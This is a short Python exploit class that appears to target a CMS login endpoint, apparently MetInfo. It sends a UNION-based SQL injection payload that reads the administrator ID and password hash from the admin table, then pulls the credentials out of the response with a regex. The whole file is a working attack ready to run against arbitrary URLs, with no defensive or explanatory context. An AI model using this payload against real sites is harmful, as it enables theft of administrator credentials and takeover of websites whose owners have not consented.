# coding:utf-8
import requests
import re

class Exploit:

    payload = "/member/login.php/aa'UNION SELECT (select concat(admin_id,0x23,admin_pass) from met_admin_table limit 1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa"
    comp = r"\|cn\|(\S+)\|\|\|"

    def attack(self, url):
        response = requests.get(url+self.payload)
        if response.status_code == 200:
            retValue = re.search(self.comp, response.text)
            if retValue and len(retValue.groups()) > 0:
                return "{}   {}".format(url, retValue.group(1))